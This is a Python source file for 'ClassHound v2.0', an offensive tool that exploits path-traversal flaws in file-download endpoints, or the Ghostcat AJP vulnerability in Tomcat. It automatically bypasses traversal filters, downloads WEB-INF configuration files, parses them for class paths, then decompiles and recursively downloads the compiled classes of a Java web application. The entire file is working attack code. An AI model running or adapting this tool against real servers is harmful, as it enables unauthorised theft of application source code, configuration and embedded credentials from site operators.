#!/usr/bin/env python
# coding: utf-8
# Build By LandGrey

import io
import re
import time
import urllib3
import requests
import argparse
import subprocess
from thirdparty.lib import *
from thirdparty.ghostcat import *

from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter


try:
    from urllib import quote
    reload(sys)
    sys.setdefaultencoding('utf8')
except ImportError:
    from urllib.request import quote
finally:
    urllib3.disable_warnings()


session = requests.Session()
session.mount('http://', HTTPAdapter(max_retries=2))
session.mount('https://', HTTPAdapter(max_retries=2))


def change_travel_path(travel_file_path):
    global url, post_data

    _data = travel_char * travel_char_count + travel_file_path
    raw_file_path = delimiter + normal_path + delimiter
    if raw_post_data:
        post_data = raw_post_data.replace(raw_file_path, _data)
    else:
        url = raw_url.replace(raw_file_path, _data)


def request():
    if sleep_time > 0:
        time.sleep(sleep_time)
    try:
        if not post_data:
            r = session.get(url, headers=headers, verify=False, timeout=15, allow_redirects=True)
        else:
            r = session.post(url, headers=headers, data=post_data, verify=False, timeout=15, allow_redirects=True)
        return r.status_code, r.content
    except requests.exceptions.ConnectionError as e:
        print("[-] Request ConnectionError!")


def download_and_save(travel_file_path, auto_change_count=False):
    global travel_char_count

    travel_file_path = travel_file_path.lstrip('/')
    pre_count = travel_char_count
    success = False

    if use_vulnerability == "ghostcat":
        success = True
        _content = exploit_ajp(url, ajp_port, travel_file_path, method='GET' if not post_data else 'POST', headers=headers)
        if keyword not in str(_content):
            sys.stdout.write('\r[+] Download [{}] ok !'.format(travel_file_path))
            save_file(workspace, travel_file_path, _content)
        else:
            sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
        sys.stdout.flush()
    else:
        change_travel_path(travel_file_path)
        _status_code, _content = request()

        if _content and _status_code == normal_status_code and keyword not in str(_content):
            try:
                save_file(workspace, travel_file_path, _content)
                sys.stdout.write('\r[+] Download [{}] ok{}'.format(travel_file_path, ' ' * 10))
                success = True
                travel_char_count = pre_count
            except Exception as e:
                sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
        else:
            sys.stdout.write('\r[-] Download [{}] failed'.format(travel_file_path))
        sys.stdout.flush()

    # 没下载成功并使用 --auto 时
    if auto_change_count and not success:
        ranges = range(1, max_count)
        ranges.remove(travel_char_count)
        for r in ranges:
            travel_char_count = r
            change_travel_path(travel_file_path)
            _status_code, _content = request()
            if _content and _status_code == normal_status_code and keyword not in str(_content):
                try:
                    save_file(workspace, travel_file_path, _content)
                    sys.stdout.write('\r[+] Download [{}] ok !'.format(travel_file_path))
                    travel_char_count = r
                    break
                except Exception as e:
                    sys.stdout.write('\r[-] Download [{}] failed !'.format(travel_file_path))
            else:
                sys.stdout.write('\r[-] Download [{}] failed !'.format(travel_file_path))
            sys.stdout.flush()


def disk_path_to_url_dir_path(disk_path):
    """
    :param disk_path:
    :return: /WEB-INF/config', '/WEB-INF/config/cache-context.xml
    """
    url_path = os.path.abspath(disk_path)[len(os.path.abspath(workspace)):].replace('\\', '/')
    url_dir = os.path.split(url_path)[0]
    return url_dir, url_path


def parse_xml_get_xml_url(xml_path):
    with io.open(xml_path, 'r', encoding="utf-8") as f:
        content = f.read()
        soup = BeautifulSoup(content, 'html.parser')
        values = []
        xml_urls = []
        # 解析全局 context-param 中 xml 文件路径
        for param in soup.find_all('context-param'):
            for child in param.find_all('param-value'):
                values.extend(file_path_extract(child.text))
        # 解析 servlet 中 xml 文件路径
        for servlet in soup.find_all('servlet'):
            servlet_name = servlet.find('servlet-name')
            for servlet_param in servlet.find_all('init-param'):
                param_value = servlet_param.find('param-value')
                if not param_value:
                    xml_urls.append(base_path + 'WEB-INF/{}-servlet.xml'.format(servlet_name))
                    xml_urls.append(base_path + 'WEB-INF/classes/{}-servlet.xml'.format(servlet_name))
                else:
                    values.extend(file_path_extract(param_value.text))
        # 模糊正则匹配其他情况
        matches = re.findall('<value>(.*?)</value>', content)
        if matches:
            for m in matches:
                values.extend(file_path_extract(m))
        for value in values:
            if not value.strip() or "*" in value:
                continue
            if "WEB-INF/" in value.upper():
                xml_urls.append(value.strip().lstrip('/'))
            else:
                if "classes/" in value.lower():
                    xml_urls.append("WEB-INF/" + value.strip().lstrip('/'))
                else:
                    xml_urls.append("WEB-INF/classes/" + value.strip().lstrip('/'))
    xml_urls = list(set(xml_urls))
    return xml_urls


def match_and_download_xml(path):
    xml_urls = parse_xml_get_xml_url(path)
    for xml_url in xml_urls:
        for extension in do_download_extensions_from_xml:
            if xml_url.endswith(extension):
                download_and_save(xml_url)
                break


def decompile_and_download_class(class_path):
    command = ['java', '-jar', '{}'.format(os.path.join(current_folder, 'thirdparty', 'cfr-0.145.jar')), class_path]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    # 保存反编译的 class 文件
    relative_java_path = class_path.replace(workspace, '').replace('classes', 'java').replace('.class', '.java').lstrip('/')
    save_file(workspace, relative_java_path, stdout)
    match = re.findall('import (.*?);', stdout.decode('utf-8'), re.I | re.M | re.S)
    if match:
        for m in match:
            _class_url_path = base_path + 'WEB-INF/classes/' + m.strip().replace(".", "/") + '.class'
            _allow_download = True
            for x in do_not_download_classes:
                if x in _class_url_path:
                    _allow_download = False
            if _allow_download and _class_url_path not in already_download_class_url_list:
                download_and_save(_class_url_path)
                already_download_class_url_list.append(_class_url_path)


if __name__ == '__main__':
    start_time = time.time()
    print('''
                              _     _      |         
                  ,,,,,     o' \,=./ `o    |.===.    
                 /(o o)\       (o o)       {}o o{}   
              ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
                                                            ClassHound v2.0\n
''')
    try:
        current_folder = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
    except UnicodeError as e:
        try:
            current_folder = os.path.dirname(os.path.abspath(sys.argv[0])).decode('utf-8')
        except UnicodeError as e:
            current_folder = "."
            exit('[*] Please play script in ascii string path')

    # arguments init
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='raw_url', default='', help='Full download url, file path must surrounded with delimiter char.\nSuch as: http://127.0.0.1/download.jsp?path=images/#1.png#')
    parser.add_argument('-k', '--keyword', dest='keyword', default=None, help='404 page keyword')
    parser.add_argument('-p', '--post', dest='raw_post_data', default='', help='POST data, file path must surrounded with delimiter char')
    parser.add_argument('-f', '--file', dest='url_file', default='', help='specify need download file url path list')
    parser.add_argument('-a', '--auto', dest='auto_change', default=False, action='store_true', help='auto detect and change travel char count when use -f options')
    parser.add_argument('-s', '--sleep-time', dest='sleep_time', default=0, type=float, help='sleep_time some seconds between two requests')
    parser.add_argument('-bp', '--base-path', dest='base_path', default='/', help='/WEB-INF folder prefix web path, default: "/".\nSuch as: change it to "opt/tomcat/webapps/"')
    parser.add_argument('-tc', '--travel-char', dest='travel_char', default='', help='specify travel char like ../')
    parser.add_argument('-cc', '--char-count', dest='travel_char_count', default=-1, type=int, help='travel char count number')
    parser.add_argument('-dc', '--delimiter-char', dest='delimiter_char', default='#', help='Delimiter char that surround file path , default: #')
    parser.add_argument('-hh', '--http-header', dest='http_header', default='', help='Add http request header, format: "Referer:http://127.0.0.1,admin:true"')
    parser.add_argument('-hp', '--http-proxy', dest='http_proxy', default=None, help='set http/https proxy')
    parser.add_argument('-mc', '--max-count', dest='max_count', default=8, type=int, help='max try travel char count, default: 10')
    parser.add_argument('-vul', '--vulnerability', dest='vulnerability', choices=['ghostcat'], default='', help='use other vulnerability to download file.\nSuch as: ghostcat')
    parser.add_argument('--ajp-port', dest='ajp_port', default=8009, type=int, help='ghostcat vulnerability ajp port, default: 8009')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()

    raw_url = args.raw_url
    keyword = args.keyword
    auto = args.auto_change
    sleep_time = args.sleep_time
    max_count = args.max_count
    http_proxy = args.http_proxy
    download_path = args.url_file
    base_path = args.base_path
    travel_char = args.travel_char
    http_header = args.http_header
    delimiter = args.delimiter_char
    raw_post_data = args.raw_post_data
    travel_char_count = args.travel_char_count
    use_vulnerability = args.vulnerability
    ajp_port = args.ajp_port

    # variable declare
    url = raw_url
    post_data = raw_post_data
    init_travel_files_with_prefix = []

    already_append_xml_disk_path_list = []
    not_parsed_disk_xml_path_list = []

    already_download_class_url_list = []
    already_download_class_disk_path_list = []
    not_decompile_disk_class_path_list = []

    workspace = get_workspace(raw_url)

    session.proxies = {'http': http_proxy, 'https': http_proxy}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Connection': 'Keep-Alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    # 设置额外 HTTP headers
    if http_header:
        for header in http_header.split(","):
            header = header.strip()
            if header:
                kv = header.split(":")
                headers.update({kv[0].strip(): kv[-1].strip()})

    for x in init_travel_files_without_prefix:
        init_travel_files_with_prefix.append((base_path if base_path != "/" else "") + x)

    try:
        if raw_post_data:
            normal_path = re.findall(delimiter + '(.*?)' + delimiter, post_data)[0]
            post_data = raw_post_data.replace(delimiter, '')
        else:
            normal_path = re.findall(delimiter + '(.*?)' + delimiter, raw_url)[0]
            url = raw_url.replace(delimiter, '')
        if len(normal_path) == 0:
            exit('Invalid delimiter char {}, please changed!'.format(delimiter))
    except IndexError:
        normal_path = "fake path"
        if not use_vulnerability:
            exit('Cannot match valid file path in the middle of "{0} {0}"'.format(delimiter))

    if use_vulnerability == 'ghostcat':
        if keyword is None:
            try:
                keyword = str(exploit_ajp(url, ajp_port, get_random_string(suffix=".jsp"), method='GET' if not post_data else 'POST', headers=headers))
            except Exception as e:
                keyword = "page not found"
        for _tf in init_travel_files_without_prefix:
            _xml_content = exploit_ajp(url, ajp_port, _tf, method='GET' if not post_data else 'POST', headers=headers)
            if keyword not in str(_xml_content):
                save_file(workspace, _tf, _xml_content)
                sys.stdout.write('\r[+] Download [{}] ok !'.format(_tf))
                sys.stdout.flush()
    else:
        if keyword is None:
            keyword = "page not found"
        # 获得正常下载请求的状态码和内容
        normal_status_code, normal_content = request()
        # 没指定遍历字符时自动探测遍历字符
        if not travel_char:
            travel_char = '../'
            # 正常文件名倒数第二位插入 ./ 探测目标是否会替换 ./ 为空字符
            change_travel_path(normal_path[:-1] + './' + normal_path[-1])
            char_status_code, char_content = request()
            # 被替换
            if char_status_code == normal_status_code and char_content == normal_content:
                travel_char = '...//'
                # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
                change_travel_path(normal_path[:-1] + '../' + normal_path[-1])
                char_status_code, char_content = request()
                # 被替换
                if char_status_code == normal_status_code and char_content == normal_content:
                    travel_char = '.....///'
            else:
                # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
                change_travel_path(normal_path[:-1] + '../' + normal_path[-1])
                char_status_code, char_content = request()
                # 被替换
                if char_status_code == normal_status_code and char_content == normal_content:
                    travel_char = '....//'

        # 首先尝试下载内置的配置文件列表
        for _tf in init_travel_files_with_prefix:
            # 手动指定遍历字符数量不再自动探测
            if travel_char_count != -1:
                change_travel_path(travel_char * travel_char_count + _tf)
                try_status_code, try_content = request()
                if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
                    save_file(workspace, _tf, try_content)
                    print('\r[+] Travel Char: [{}] Count: [{}]. Success download: [{}]'.format(travel_char, travel_char_count, _tf))
            else:
                for x in range(1, max_count + 1):
                    change_travel_path(travel_char * x + _tf)
                    try_status_code, try_content = request()
                    if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
                        travel_char_count = x if travel_char_count == 0 else travel_char_count
                        save_file(workspace, _tf, try_content)
                        print('\r[+] Travel Char: [{}] Count: [{}]. Success download: [{}]'.format(travel_char, travel_char_count, _tf))
                        break

    try:
        # 指定了额外的下载文件列表
        if download_path:
            print("[+] Download from [{}] file ...".format(download_path))
            if os.path.isfile(download_path):
                with io.open(download_path, 'r', encoding="utf-8") as f:
                    for line in f.readlines():
                        if line.strip():
                            download_and_save(line.strip(), auto_change_count=True)
            else:
                exit("[-] File [{}] not exists".format(download_path))
        else:
            print("\r[+] Download [*.xml] files by prepared files list ...")
            # 循环解析下载 xml 文件
            continue_xml_parse_and_download = True
            while True and continue_xml_parse_and_download:
                for fp in walk_file_paths(workspace):
                    # 首先更新未解析 xml 路径列表
                    if fp in not_parsed_disk_xml_path_list:
                        not_parsed_disk_xml_path_list.remove(fp)
                    # 解析从未解析过的 xml 文件
                    if fp.endswith('.xml') and fp not in already_append_xml_disk_path_list:
                        match_and_download_xml(fp)
                        # 历史已解析 xml 列表
                        already_append_xml_disk_path_list.append(fp)
                        # 剩下的未解析 xml 列表
                        not_parsed_disk_xml_path_list.append(fp)
                # 如果本地 xml 文件全部都被解析过则退出循环
                if not not_parsed_disk_xml_path_list:
                    continue_xml_parse_and_download = False

            print("\r[+] Download [*.class] files parsing from [*.xml] files ...")
            # 粗粒度提取 xml 文件中 class 地址并尝试下载到本地
            class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|classname="(.*?)"|type="(.*?)"|resource="(.*?)"'
            for fp in walk_file_paths(workspace):
                if fp.endswith('.xml'):
                    try:
                        m = re.findall(class_pattern, io.open(fp, 'r', encoding="utf-8").read(), re.I | re.M | re.S)
                    except Exception as e:
                        m = re.findall(class_pattern, io.open(fp, 'r').read(), re.I | re.M | re.S)
                    if m:
                        for _m in m:
                            match_m = _m[0]
                            for x in range(0, len(_m)):
                                if _m[x]:
                                    match_m = _m[x]
                                    break
                            class_path_uri = match_m.replace(".", "/").strip()
                            class_url_path = base_path + 'WEB-INF/classes/' + class_path_uri + '.class'
                            allow_download = True
                            for x in do_not_download_classes:
                                if ('/' + class_path_uri).startswith(x):
                                    allow_download = False
                            if allow_download and class_url_path not in already_download_class_url_list:
                                download_and_save(class_url_path)
                                already_download_class_url_list.append(class_url_path)

            print("\r[+] Download [*.class] files by decompiled [*.class] files ...")
            # 循环反编译 class 文件并下载到本地
            continue_class_parse_and_download = True
            while True and continue_class_parse_and_download:
                for fp in walk_file_paths(workspace):
                    if fp in not_decompile_disk_class_path_list:
                        not_decompile_disk_class_path_list.remove(fp)
                    if fp.endswith('.class') and fp not in already_download_class_disk_path_list:
                        decompile_and_download_class(fp)
                        already_download_class_disk_path_list.append(fp)
                        not_decompile_disk_class_path_list.append(fp)
                # 如果本地 xml 文件全部都被解析过则退出循环
                if not not_decompile_disk_class_path_list:
                    continue_class_parse_and_download = False
    except KeyboardInterrupt:
        print("\n[*] User press CTR+C !")

    # 统计下最终下载的文件类型和数量
    fs = {}
    description = ""
    for fp in walk_file_paths(workspace):
        fn = os.path.split(fp)[-1]
        if len(fn.split(".")) == 2:
            if fn.split(".")[-1]:
                if fn.split(".")[-1] in fs.keys():
                    fs[fn.split(".")[-1]] += 1
                else:
                    fs[fn.split(".")[-1]] = 1
        else:
            if 'other' in fs.keys():
                fs['other'] += 1
            else:
                fs['other'] = 1
    for k, v in fs.items():
        description += "\n[+] Download   {:10}  files : {}".format(k, v)
    print("\n\r[+] All cost   {:10}  seconds{}\n[+] result in: {}".format(str(time.time() - start_time)[:6], description, workspace))
